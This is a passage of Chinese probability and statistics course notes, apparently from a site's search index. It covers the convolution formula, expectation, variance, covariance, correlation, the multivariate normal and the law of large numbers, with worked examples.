<p>\u8fd9\u6761\u7b49\u5f0f\u4e0e\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\u7b49\u4ef7\u3002</p> <p>\u53e6\u6709\u5b9a\u7406\uff0c\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\u7684\u5145\u8981\u6761\u4ef6\u662f \\(X,Y\\) \u7684\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\u51e0\u4e4e\u5904\u5904\u53ef\u5199\u6210 \\(x\\) \u7684\u51fd\u6570 \\(m(x)\\) \u4e0e \\(y\\) \u7684\u51fd\u6570 \\(n(y)\\) \u7684\u4e58\u79ef\uff0c\u5373\uff1a</p> \\[ f(x,y) =m(x)\\cdot n(y), \\ \\ -\\infty \\lt x\\lt +\\infty, \\ -\\infty \\lt y\\lt +\\infty  \\]"},{"location":"Courses/PS/CH3/#_12","title":"\u4e8c\u5143\u968f\u673a\u53d8\u91cf\u7684\u51fd\u6570\u5206\u5e03","text":"<p>\u4f8b 1\uff1a</p> <p>\u8bbe \\(X\\) \u7684\u5bc6\u5ea6\u51fd\u6570 \\(f(x)=\\left \\{ \\begin{array}l e^{-x}, &amp; x\\gt 0 \\\\ 0, &amp; x\\le 0 \\end{array} \\right .\\)</p> <p>\u4ee4\uff1a</p> \\[ U = \\left \\{\\begin{array}l 1, x\\gt 1 \\\\ 0, x\\le 1\\end{array} \\right . \\ ,\\ \\ \\ V=\\left \\{\\begin{array}l 1, x\\gt 2 \\\\ 0, x\\le 2\\end{array} \\right . \\] <p>\u6c42 \\((U,V)\\) \u7684\u8054\u5408\u5206\u5e03\u5f8b</p> \\[\\begin{array}l P(U=1,V=1)=P(X\\gt 1,X\\gt 2)=P(X\\gt 2)=e^{-2} \\\\ P(U=1,V=0)=P(X\\gt 1,X\\le 2)=P(1\\lt X\\le 2)=e^{-1}- e^{-2} \\\\ P(U=0,V=1)=P(X\\le 1,X\\gt2)=0 \\\\ P(U=0,V=0)=P(X\\le 1, X\\le 2)=P(X\\le 1)=1-e^{-1} \\end{array} \\] <p>\u4f8b 2\uff1a</p> <p>\u8bbe\u968f\u673a\u53d8\u91cf\u6ee1\u8db3\u6cca\u677e\u5206\u5e03\uff1a</p> \\[ X\\sim P(\\lambda_1) ,\\ \\ Y\\sim P(\\lambda_2) \\] <p>\u4e14 \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\u3002\u82e5 \\(Z=X+Y\\)\uff0c\u6c42 \\(Z\\) \u7684\u6982\u7387\u5206\u5e03\u5f8b\uff1a</p> \\[\\begin{array}c P(X=i)= \\frac{\\lambda_1^i e^{-\\lambda_1}}{i!} \\\\ P(Y=j)= \\frac{\\lambda_2^j e^{-\\lambda_2}}{j!} \\\\ \\begin{array}l P(Z=k)&amp; =\\sum ^k_{i=0} P(X=i)P(Y=k-i) \\\\ &amp; =\\sum ^k_{i=0} \\frac{\\lambda_1^i e^{-\\lambda_1}}{i!} \\frac{\\lambda_2^{k-i} e^{-\\lambda_2}}{(k-i)!} \\\\ &amp; = \\frac{e^{-(\\lambda_1 +\\lambda_2)}}{k!} \\sum^k_{i=0} \\frac{k!}{i!(k-1)!} \\lambda_1^{i} \\lambda_2^{k-i} \\\\ &amp; =\\frac{(\\lambda_1+\\lambda _2)^k e^{-(\\lambda_1 +\\lambda_2)}}{k!} \\\\ \\end{array} \\\\ \\Rightarrow Z=X+Y\\sim P(\\lambda_1 +\\lambda_2) \\end{array} \\] <p>\u4f8b 3\uff1a</p> <p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\sim U(0,1)\\)\uff0c\\(Y\\) \u7684\u5bc6\u5ea6\u51fd\u6570\u4e3a</p> \\[ f_Y(y)=\\left \\{\\begin{array}l 2y, &amp; 0\\lt y\\lt 1 \\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{array}\\right . \\] <p>\u4e14 \\(X\\) \u548c \\(Y\\) \u76f8\u4e92\u72ec\u7acb\u3002\u8bb0 \\(M=\\max \\{X,Y\\},N=\\min \\{X,Y\\}\\)\uff0c\u5206\u522b\u6c42\u5176\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[\\begin{array}c F_X(x)=\\left \\{\\begin{array}l 1, &amp; 1\\lt x\\\\ x, &amp; 0\\lt x \\lt 1 \\\\ 0, &amp; x\\lt 0 \\end{array}\\right . , \\ \\ \\ \\  F_Y(y)=\\left \\{\\begin{array}l 1, &amp; 1\\lt y\\\\ y^2, &amp; 0\\lt y \\lt 1 \\\\ 0, &amp; y\\lt 0 \\end{array}\\right . \\\\ F_M(m)=P(M\\le m)=P(X\\le m,Y\\le m)=F_X(m)\\cdot F_Y(m) \\\\ \\Rightarrow \\ f_M(m) = F'_M(m)=\\left \\{\\begin{array}l 3m^2, &amp; 0\\lt m\\lt 1 \\\\ 0, &amp; \\text{\u5176\u4ed6}\\end{array} \\right . \\\\ F_N(n)=P(\\min \\{X,Y\\}\\le n)=F_X(n)+ (1-F_X(n))\\cdot F_Y(n) \\\\ \\Rightarrow \\ f_N(n)=F'_N(n)=\\left \\{ \\begin{array}l  1+2n-3n^2, &amp; 0\\lt n\\lt 1 \\\\ 0, &amp; \\text{\u5176\u4ed6}\\end{array}\\right . \\end{array} \\]"},{"location":"Courses/PS/CH3/#_13","title":"\u5377\u79ef\u516c\u5f0f","text":"<p>\u5bf9\u4e8e\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(f(x,y)\\) \u7684\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X,Y\\) \uff0c\\(Z=X+Y\\) \u7684\u5206\u5e03\u51fd\u6570\u4e3a\uff1a</p> \\[\\begin{array}l F_Z(z)=P(Z\\le z) &amp; = \\iint_{x+y\\le z} f(x,y)dxdy \\\\ &amp; =\\int^{+\\infty}_{-\\infty}[ \\int_{-\\infty}^{z-y}f(x,y)dx]dy \\\\ \\text{(Let u=x+y)}&amp; =\\int^{+\\infty}_{-\\infty} [ \\int_{-\\infty}^{z}f(u-y,y)du]dy \\\\ &amp; = \\int^z_{-\\infty}[ \\int_{-\\infty}^{+\\infty}f(u-y,y)dy]du \\\\ &amp; = \\int^z_{-\\infty} f_Z(u)du \\end{array} \\] <p>\u6545\u5f97\u51fa\u7ed3\u8bba\uff1a</p> \\[ f_Z(z)=\\int_{-\\infty}^{+\\infty}f(z-y,y)dy = \\int_{-\\infty}^{+\\infty}f(x,z-x)dx \\] <p>\u82e5 \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb,\u5219\uff1a</p> \\[ f_Z(z)=\\int_{-\\infty}^{+\\infty} f_X(z-y) f_Y(y)dy =\\int_{-\\infty}^{+\\infty} f_X(x) f_Y(z-x)dx \\] <p>\u4f8b 3\uff1a</p> \\[ f(x,y)=\\left \\{\\begin{array}l 3x , &amp; 0\\lt y\\lt x\\lt 1\\\\0, &amp; \\text{\u5176\u4ed6} \\end{array} \\right . \\] <p>\u6c42 \\(Z=X+Y\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570</p> \\[\\begin{array}c f_Z(z)=\\int ^{+\\infty}_{-\\infty} f(x,z-x)dx \\\\ f(x,z-x)=\\left \\{\\begin{array}l 3x, &amp; 0\\lt z-x\\lt x\\lt 1 \\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{array} \\right . \\\\ 0\\lt z-x\\lt x\\lt 1 \\Leftrightarrow \\frac{z}{2}\\le x\\le \\min (z,1) \\\\ f_Z(z) = \\left \\{\\begin{array}l  \\int ^z_{\\frac{z}{2}} 3xdx = \\frac{9}{8}z^2 , &amp; 0\\lt z\\le 1 \\\\ \\int ^1_{\\frac{z}{2}} 3xdx = \\frac{3}{2}(1- \\frac{z^2}{4}), &amp; 1\\lt z\\lt 2 \\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{array} \\right . \\end{array}\\] <p>\u5bf9\u8c01\u79ef\u5206\u5c31\u5199\u51fa\u8c01\u7684\u53d6\u503c\u8303\u56f4\uff0c\u5982\u8be5\u9898\u7684 \\(dx\\)\uff0c\u800c\u4e0a\u4e0b\u9650\u5219\u662f\u5173\u4e8e \\(z\\) \u7684\u51fd\u6570</p> <p>\u4f8b 4\uff1a</p> <p>\u76f8\u4e92\u72ec\u7acb\u7684\u968f\u673a\u53d8\u91cf \\(X\\sim U(0,1), Y\\sim U(0,1)\\) \uff0c\u6c42 \\(Z=X+Y\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff1a</p> <p>\u89e3\u7b54\uff1a</p> <p>\uff081\uff09\u65b9\u6cd5\u4e00\uff0c\u5377\u79ef\u516c\u5f0f\uff1a</p> \\[\\begin{array}c f_Z(z)=\\int _{-\\infty}^{+\\infty} f_X(x) f_Y(z-x) dx \\\\ \\text{\u5f53\u4e14\u4ec5\u5f53\uff1a} \\begin{cases} 0\\le x\\le 1 \\\\ 0\\le z-x\\le 1\\end{cases} \\text{ \u65f6\u88ab\u79ef\u51fd\u6570\u4e0d\u7b49\u4e8e0}\\\\ f_Z(z)= \\begin{cases}\\int_0^z dx = z, &amp; 0\\le z\\le 1 \\\\ \\int _{z-1}^1 dx = 2-z, &amp; 1\\lt  z\\le 2  \\\\ 0, &amp; \\text{\u5176\u4ed6}\\end{cases} \\end{array}\\] <p>\uff082\uff09\u65b9\u6cd5\u4e8c\uff0c\u5206\u5e03\u51fd\u6570\u5b9a\u4e49(\u753b\u56fe)\uff1a</p> <p></p> <ul> <li>\u5f53 \\(z\\lt 0\\) \u65f6\uff0c\\(F_Z(z)=P(X+Y\\le z) =0\\)</li> <li>\u5f53 \\(z\\ge 2\\) \u65f6\uff0c\\(F_Z(z)=P(X+Y\\le z)=1\\)</li> <li>\u5f53 \\(0\\le z\\le 1\\) \u65f6\uff0c\\(F_Z(z)= P(X+Y\\le z)=\\frac{1}{2}z^2\\)</li> <li>\u5f53 \\(1\\lt z\\le 2\\) \u65f6\uff0c\\(F_Z(z)=P(X+Y\\le z)= 1- \\frac{1}{2}(1-(z-1)^2)\\)</li> </ul> <p>\u5bf9\u5206\u5e03\u51fd\u6570\u6c42\u5bfc\u53ef\u5f97\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u3002</p>"},{"location":"Courses/PS/CH4/","title":"\u968f\u673a\u53d8\u91cf\u7684\u6570\u5b57\u7279\u5f81","text":""},{"location":"Courses/PS/CH4/#_1","title":"\u968f\u673a\u53d8\u91cf\u7684\u6570\u5b57\u7279\u5f81","text":"<p> \u7ea6 878 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p></p>"},{"location":"Courses/PS/CH4/#_2","title":"\u6570\u5b66\u671f\u671b","text":""},{"location":"Courses/PS/CH4/#_3","title":"\u5b9a\u4e49","text":"<p>\u6570\u5b66\u671f\u671b\u7b80\u79f0\u671f\u671b\uff0c\u53c8\u79f0\u5747\u503c\u3002</p> \u79bb\u6563\u578b\u8fde\u7eed\u578b <p>\u8bbe\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5206\u5e03\u5f8b\u4e3a \\(P(X= x_k)= p_k\\) \uff0c\u82e5\u7ea7\u6570 \\(\\sum _{k=1}^{+\\infty} |x_k| p_k &lt;\\infty\\) \uff0c\u5219\u79f0\u53d8\u91cf\u7684\u6570\u5b66\u671f\u671b \\(E(X)\\) \u4e3a\uff1a</p> \\[E(X)=\\sum _{k=1}^{+\\infty} x_k p_k\\] <p>\u8bbe\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(f(x)\\)\uff0c\u82e5\u79ef\u5206 \\(\\int _{-\\infty}^{+\\infty} |x|f(x)dx &lt;\\infty\\) \uff0c\u5219\u79f0\u53d8\u91cf\u7684\u6570\u5b66\u671f\u671b \\(E(X)\\) \u4e3a\uff1a</p> \\[E(X)=\\int _{-\\infty}^{+\\infty} xf(x)dx\\]"},{"location":"Courses/PS/CH4/#_4","title":"\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u6570\u5b66\u671f\u671b","text":"<p>\u79bb\u6563\u578b\u53d8\u91cf\u61d2\u5f97\u8bf4\u4e86</p> <p>\u8bbe \\(Y=g(X)\\)\uff0c\u4e14 \\(\\int _{-\\infty}^{+\\infty} |g(x)|f(x)dx &lt;\\infty\\) \uff0c\u5219\u6709\uff1a</p> \\[ E(Y)=E(g(X)) = \\int _{-\\infty}^{+\\infty} g(x)f(x)dx \\] <p>\u5e94\u7528\u8be5\u5b9a\u7406\uff0c\u5c31\u4e0d\u9700\u8981\u4e13\u95e8\u6c42\u51fa \\(Y\\) \u7684\u5206\u5e03\u5f8b\u6216\u5bc6\u5ea6\u51fd\u6570</p> <p>\u62d3\u5c55\u5230\u591a\u5143\u968f\u673a\u53d8\u91cf\uff1a</p> <p>\u8bbe \\(Z=h(X,Y)\\) \uff0c\u4e8c\u5143\u578b\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(f(x,y)\\)\uff0c\\(E(Z)\\) \u5b58\u5728\uff0c\u5219\u6709\uff1a</p> \\[ E(Z)=E(h(X,Y))=\\int _{-\\infty}^{+\\infty} \\int _{-\\infty}^{+\\infty} h(x,y)f(x,y)dxdy \\] <p>\u6570\u5b66\u671f\u671b\u7684\u6027\u8d28</p> <p>\u8bbe \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219\u6709 \\(E(XY)=E(X)E(Y)\\)</p>"},{"location":"Courses/PS/CH4/#_5","title":"\u65b9\u5dee","text":""},{"location":"Courses/PS/CH4/#_6","title":"\u5b9a\u4e49","text":"<p>\u65b9\u5dee \\(Var(X)\\) \u523b\u753b\u4e86\u53d8\u91cf\u53d6\u503c\u7684\u5206\u6563\u7a0b\u5ea6\uff0c\u82e5\u53d6\u503c\u8f83\u96c6\u4e2d\uff0c\u5219 \\(Var(X)\\) \u8f83\u5c0f\u3002</p> <p>\u8bbe \\(X\\) \u662f\u968f\u673a\u53d8\u91cf\uff0c\u82e5 \\(E\\{[X-E(X)]^2\\}\\) \u5b58\u5728\uff0c\u5219\u79f0\u65b9\u5dee \\(Var(X)\\) \u6216 \\(D(X)\\) \u4e3a\uff1a</p> \\[ Var(X)=E\\{[X-E(X)]^2\\} \\] <p>\u5c06 \\(\\sqrt{Var(X)}\\) \u8bb0\u4e3a \\(\\sigma(X)\\) \uff0c\u79f0\u4e3a\u53d8\u91cf \\(X\\) \u7684\u6807\u51c6\u5dee\u6216\u5747\u65b9\u5dee\uff0c\u5b83\u4e0e \\(X\\) \u5177\u6709\u76f8\u540c\u7684\u91cf\u7eb2\u3002</p> \u79bb\u6563\u578b\u8fde\u7eed\u578b \\[Var(X)=\\sum _{i=1}^{\\infty} [x_i-E(X)]^2 p_i\\] \\[Var(X)=\\int _{-\\infty}^{+\\infty} [x-E(X)]^2f(x) dx\\] <p>\u5b9e\u9645\u4e0a\u6709\u91cd\u8981\u8ba1\u7b97\u516c\u5f0f\uff1a</p> \\[ Var(X)=E(X^2) -E^2(X) \\] \u6cca\u677e\u5206\u5e03\u65b9\u5dee\u7684\u8ba1\u7b97 <p></p>"},{"location":"Courses/PS/CH4/#_7","title":"\u6027\u8d28","text":"<ul> <li>&lt;1&gt; \u82e5 \\(C\\) \u662f\u5e38\u6570\uff0c\u5219 \\(Var(C)=0\\)</li> <li>&lt;2&gt; \u8bbe \\(X\\) \u662f\u968f\u673a\u53d8\u91cf\uff0c\\(C\\) \u662f\u5e38\u6570\uff0c\u5219\u6709 \\(D(CX)=C^2D(X)\\)</li> <li>&lt;3&gt; \u8bbe \\(X,Y\\) \u662f\u4e24\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5219\u6709 <ul> <li> \\[Var(X+Y)=Var(X)+Var(Y)+2E\\{[X-E(X)][Y-E(Y)]\\}\\] </li> <li>\u7279\u522b\u7684\uff0c\u82e5 \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219\u6709 \\(D(X+Y)=D(X) +D(Y)\\)</li> </ul> </li> </ul> <p>\u7efc\u5408\u4ee5\u4e0a\u4e09\u9879\uff0c\u53ef\u4ee5\u6709\u5982\u4e0b\u5b9a\u7406\uff1a</p> <p>\u8bbe \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\\(a,b,c\\) \u662f\u5e38\u6570\uff0c\u5219</p> \\[ Var(aX+bY+c)=a^2Var(X) +b^2Var(Y) \\] <p>\u8be5\u5b9a\u7406\u53ef\u63a8\u5e7f\u5230\u4efb\u610f\u6709\u9650\u4e2a\u72ec\u7acb\u968f\u673a\u53d8\u91cf\u7684\u7ebf\u6027\u7ec4\u5408</p> <p>\u6807\u51c6\u5316\u53d8\u91cf</p> <p>\u82e5\u968f\u673a\u53d8\u91cf \\(E(X)=\\mu, Var(X)=\\sigma^2\\) \uff0c\u8bb0 \\(X\\) \u7684\u6807\u51c6\u5316\u53d8\u91cf \\(X^*= \\frac{X-\\mu}{\\sigma}\\) \u3002</p> <p>\u663e\u7136\u6709 \\(E(X^*)=0, Var(X^*)=1\\)</p>"},{"location":"Courses/PS/CH4/#_8","title":"\u534f\u65b9\u5dee","text":""},{"location":"Courses/PS/CH4/#_9","title":"\u5b9a\u4e49","text":"<p>\u5b9a\u4e49\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u4e4b\u95f4\u7684\u534f\u65b9\u5dee \\(Cov(X,Y)\\) \u4e3a\uff1a</p> \\[ Cov(X,Y)=E\\{[X-E(X)][Y-E(Y)]\\} \\] <p>\u5219\u6211\u4eec\u6613\u5f97\u4e0b\u9762\u4e24\u6761\u91cd\u8981\u7b49\u5f0f\uff1a</p> \\[\\begin{array}l Cov(X,Y)=E(XY)-E(X)E(Y) \\\\ Var(X+Y) =Var(X)+Var(Y) +2Cov(X,Y) \\end{array} \\] <p>\u5bf9\u4e8e\u72ec\u7acb\u7684 \\(X,Y\\)\uff0c\u6c42\u5b83\u4eec\u4e58\u79ef\u7684\u65b9\u5dee\u6709\u53e6\u5916\u7684\u5f15\u7406\uff1a</p> \\[\\begin{array}l D(XY) &amp; = E(X^2 Y^2) - E^2(XY) \\\\ &amp;= E(X^2) E(Y^2) - E^2(X) E^2(Y) \\\\ &amp; = D(X)D(Y) +D(X)E^2(Y) +D(Y)E^2(X) \\end{array}\\]"},{"location":"Courses/PS/CH4/#_10","title":"\u6027\u8d28","text":"<ul> <li>&lt;1&gt; \\(Cov(X,Y)=Cov(Y,X)\\)</li> <li>&lt;2&gt; \\(Cov(X,X)=Var(X)\\)</li> <li>&lt;3&gt; \\(Cov(aX,bY)=ab\\cdot Cov(X,Y)\\)</li> <li>&lt;4&gt; \\(Cov(X_1 +X_2,Y)=Cov(X _1,Y) +Cov(X_2, Y)\\)</li> <li>&lt;5&gt; \u5f53 \\(Var(X)\\cdot Var(Y)\\ne 0\\) \u65f6\uff0c\u6709 \\((Cov(X,Y))^2\\le Var(X)Var(Y)\\)<ul> <li>\u5176\u4e2d\u7b49\u53f7\u5f53\u4e14\u4ec5\u5f53 \\(X,Y\\) \u4e4b\u95f4\u6709\u4e25\u683c\u7ebf\u6027\u5173\u7cfb\uff0c\u5373\u5b58\u5728\u5e38\u6570 \\(a,b\\) \u4f7f\u5f97 \\(P(Y=a+bX)=1\\)</li> </ul> </li> <li>&lt;6&gt; \\(X,Y\\) \u72ec\u7acb\uff0c\u5219 \\(Cov(X,Y)=0\\)</li> </ul> <p>\u5747\u5300\u5206\u5e03\u7684\u534f\u65b9\u5dee\u4e00\u822c\u4e3a0\uff0c\u82e5\u533a\u57df\u662f\u4e00\u4e2a\u4e0e\u5750\u6807\u8f74\u5e73\u884c\u7684\u77e9\u5f62\uff0c\u5219\u4e8c\u8005\u76f8\u4e92\u72ec\u7acb</p>"},{"location":"Courses/PS/CH4/#_11","title":"\u76f8\u5173\u7cfb\u6570","text":"<p>\u5b9a\u4e49 \\(X,Y\\) \u7684\u76f8\u5173\u7cfb\u6570 \\(\\rho_{XY}\\) \u4e3a\uff1a</p> \\[ \\rho _{XY}= \\frac{Cov(X,Y)}{\\sqrt{Var(X)\\cdot Var(Y)}} \\] <ul> <li>&lt;1&gt; \\(|\\rho_{XY}| \\le 1\\)</li> <li>&lt;2&gt; \\(|\\rho_{XY}|=1\\) \u7b49\u6548\u4e8e \u5b58\u5728\u5e38\u6570\u4f7f\u5f97 \\(P(Y=a+bX)=1\\)<ul> <li>\u82e5 \\(\\rho_{XY}=1\\)\uff0c\u5219 \\(b\\gt 0\\)</li> <li>\u82e5 \\(\\rho_{XY}=-1\\)\uff0c\u5219 \\(b\\lt 0\\)</li> </ul> </li> </ul> <p>\u76f8\u5173\u7cfb\u6570 \\(\\rho_{XY}\\) \u662f\u4e00\u4e2a\u7528\u6765\u8868\u5f81 \\(X,Y\\) \u4e4b\u95f4\u7ebf\u6027\u5173\u7cfb\u7d27\u5bc6\u7a0b\u5ea6\u7684\u91cf</p> <ul> <li>\u5f53 \\(|\\rho_{XY}|\\) \u8f83\u5927\u65f6\uff0c \\(e(a_0, b_0)\\) \u8f83\u5c0f\uff0c \u8868\u660e \\(X,Y\\) \u7ebf\u6027\u5173\u7cfb\u7684\u7a0b\u5ea6\u8f83\u597d\uff1b</li> <li>\u5f53 \\(|\\rho_{XY}|=1\\) \u65f6\uff0c \\(e(a_0, b_0)=0\\) \uff0c\u8868\u660e \\(X,Y\\) \u4e4b\u95f4\u4ee5\u6982\u73871\u5b58\u5728\u7ebf\u6027\u5173\u7cfb\uff1b</li> <li>\u5f53 \\(|\\rho_{XY}|\\) \u8f83\u5c0f\u65f6\uff0c \\(e(a_0, b_0)\\) \u8f83\u5927\uff0c \u8868\u660e \\(X,Y\\) \u7ebf\u6027\u5173\u7cfb\u7684\u7a0b\u5ea6\u8f83\u5dee\uff1b</li> </ul> <p>\u5176\u4e2d\uff0c\u82e5 \\(\\rho_{XY}\\gt 0\\)\uff0c\u79f0 \\(X,Y\\) \u6b63\u76f8\u5173\uff1b\u82e5 \\(\\rho_{XY}\\lt 0\\)\uff0c\u79f0 \\(X,Y\\) \u8d1f\u76f8\u5173\uff1b\u82e5 \\(\\rho_{XY}= 0\\)\uff0c\u79f0 \\(X,Y\\) \u4e0d\u76f8\u5173\u6216\u96f6\u76f8\u5173\u3002</p> <p>\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u4e0d\u76f8\u5173\uff0c\u5373 \\(\\rho_{XY}=0\\) \u7684\u7b49\u4ef7\u6761\u4ef6\u6709\uff1a</p> <ul> <li>&lt;1&gt; \\(Cov(X,Y)=0\\)</li> <li>&lt;2&gt; \\(E(XY)=E(X)E(Y)\\)</li> <li>&lt;3&gt; \\(Var(X+Y)=Var(X) +Var(Y)\\)</li> </ul> <p>\u72ec\u7acb\u4e00\u5b9a\u4e0d\u76f8\u5173\uff0c\u4e0d\u76f8\u5173\u4e0d\u4e00\u5b9a\u72ec\u7acb</p> <p>\u4e0d\u8fc7\u5728\u8054\u5408\u6b63\u6001\u5206\u5e03\u4e0b\uff0c\\(X,Y\\) \u4e0d\u76f8\u5173\u7b49\u4ef7\u4e8e\u76f8\u4e92\u72ec\u7acb\u3002</p>"},{"location":"Courses/PS/CH4/#n","title":"\u7279\u522b\u63a2\u7a76\uff1an\u5143\u8054\u5408\u6b63\u6001\u5206\u5e03","text":"<p>n\u5143\u6b63\u6001\u5206\u5e03\u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u7531\u5404\u5143\u5747\u503c\u548c\u534f\u65b9\u5dee\u77e9\u9635\u51b3\u5b9a\u3002</p> <ul> <li>n\u5143\u6b63\u6001 \\(\\Rightarrow\\) \u8fb9\u9645\u6b63\u6001</li> <li>\u8fb9\u9645\u6b63\u6001 &amp;&amp; \u76f8\u4e92\u72ec\u7acb \\(\\Rightarrow\\) n\u5143\u6b63\u6001</li> <li>n\u5143\u6b63\u6001\u7684\u7ebf\u6027\u7ec4\u5408\u4e5f\u7b26\u5408n\u5143\u6b63\u6001</li> <li>\\(X_1, X_2, ...,X_n\\) \u76f8\u4e92\u72ec\u7acb \\(\\Leftrightarrow\\) \\(X_1, X_2, ...,X_n\\) \u4e24\u4e24\u4e0d\u76f8\u5173 \\(\\Leftrightarrow\\) \u534f\u65b9\u5dee\u77e9\u9635\u4e3a\u5bf9\u89d2\u77e9\u9635</li> </ul> \u9898\u9762(1)\u89e3\u7b54(2)\u89e3\u7b54(3)\u89e3\u7b54 <p></p> <p></p> <p></p> <p></p>"},{"location":"Courses/PS/CH5/","title":"\u5927\u6570\u5b9a\u5f8b\u4e0e\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":""},{"location":"Courses/PS/CH5/#_1","title":"\u5927\u6570\u5b9a\u5f8b\u548c\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":"<p> \u7ea6 1167 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>\u8fd9\u7ae0\u7684\u9898\u76ee\u5176\u5b9e\u662f\u6700\u7b80\u5355\u7684\uff0c\u53ea\u9700\u8981\u8bb0\u4f4f\u51e0\u4e2a\u7ed3\u8bba\u5373\u53ef\uff0c\u5199\u9898\u90fd\u662f\u8f6c\u6362\u6210\u6b63\u6001\u5206\u5e03\u6c42\u89e3\u7684</p> <p>\u5927\u6570\u5b9a\u5f8b\u53ca\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\u8fd9\u4e24\u7c7b\u662f\u6781\u9650\u5b9a\u7406\u4e2d\u7684\u57fa\u672c\u7406\u8bba\u3002</p> <ul> <li>\u5927\u6570\u5b9a\u5f8b\u4e3b\u8981\u63a2\u8ba8\u968f\u673a\u53d8\u91cf\u5e8f\u5217\u7684\u5e73\u5747\u5728\u4e00\u5b9a\u6761\u4ef6\u4e0b\u7684\u7a33\u5b9a\u6027\u89c4\u5f8b</li> <li>\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\u7684\u4e3b\u8981\u7814\u7a76\u5185\u5bb9\u662f\u5927\u91cf\u7684\u968f\u673a\u53d8\u91cf\u4e4b\u548c\u7684\u5206\u5e03\u5728\u4e00\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u7528\u6b63\u6001\u5206\u5e03\u53bb\u903c\u8fd1</li> </ul>"},{"location":"Courses/PS/CH5/#_2","title":"\u5927\u6570\u5b9a\u5f8b","text":""},{"location":"Courses/PS/CH5/#_3","title":"\u6982\u7387\u610f\u4e49\u4e0b\u7684\u6781\u9650\u5b9a\u4e49","text":"<p>\u8bbe \\(\\{Y_n, n\\ge 1\\}\\) \u4e3a\u4e00\u968f\u673a\u53d8\u91cf\u5e8f\u5217\uff0c\\(c\\) \u4e3a\u4e00\u5e38\u6570\u3002\u82e5\u5bf9\u4efb\u610f\u7684 \\(\\varepsilon \\gt 0\\) \uff0c\u90fd\u6709\uff1a</p> \\[ \\lim _{n\\rightarrow +\\infty} P\\{|Y_n  -c|\\ge \\varepsilon\\} = 0 \\] <p>\u5219\u79f0 \\(\\{Y_n, n\\ge 1\\}\\) \u4f9d\u6982\u7387\u6536\u655b\u4e8e \\(c\\)\uff0c\u8bb0\u4e3a \\(Y_n \\xrightarrow P c, n\\rightarrow +\\infty\\) \u3002</p> <p>\u663e\u7136\uff0c\u4e0a\u5f0f\u4ea6\u53ef\u8868\u793a\u4e3a\uff1a</p> \\[ \\lim _{n\\rightarrow +\\infty} P\\{|Y_n  -c|\\lt \\varepsilon\\} = 1 \\] <p>\u5bf9\u4e8e\u591a\u5143\u53d8\u91cf\uff0c\u4f9d\u6982\u7387\u6536\u655b\u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> \\[\\begin{array}c \\text{\u82e5} X_n\\xrightarrow p a, Y_n\\xrightarrow p b, n\\rightarrow +\\infty, \\text{\u4e14} g(x,y) \\text{\u5728} (a,b) \\text{\u5904\u8fde\u7eed\uff0c\u5219\u6709\uff1a} \\\\ g(X_n, Y_n)\\xrightarrow p g(a,b) \\end{array} \\]"},{"location":"Courses/PS/CH5/#_4","title":"\u9a6c\u5c14\u53ef\u592b\u4e0d\u7b49\u5f0f *","text":"<p>\u82e5\u968f\u673a\u53d8\u91cf \\(Y\\) \u7684 \\(k\\) \u9636(\u539f\u70b9)\u77e9\u9635\u5b58\u5728\uff0c\u5219\u5bf9\u4efb\u610f \\(\\varepsilon \\gt 0\\) \uff0c\u6709\uff1a</p> \\[ P\\{|Y|\\ge \\varepsilon\\} \\le \\frac{E(|Y|^k)}{\\varepsilon ^k} \\] <p>\u4ea6\u53ef\u5199\u4f5c\uff1a</p> \\[ P\\{|Y|\\lt \\varepsilon\\} \\ge 1-\\frac{E(|Y|^k)}{\\varepsilon ^k} \\] <p>\u4e0d\u5728\u8003\u5bdf\u8303\u56f4\u5185</p>"},{"location":"Courses/PS/CH5/#_5","title":"\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f","text":"<p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6570\u5b66\u671f\u671b\u548c\u65b9\u5dee\u5b58\u5728 , \u5206\u522b\u8bb0\u4e3a \\(\\mu, \\sigma ^2\\) , \u5219\u5bf9\u4efb\u610f\u7684 \\(\\varepsilon \\gt 0\\), \u6709\uff1a</p> \\[ P\\{|X-\\mu| \\ge \\varepsilon\\} \\le \\frac{\\sigma^2 }{\\varepsilon^2} \\] 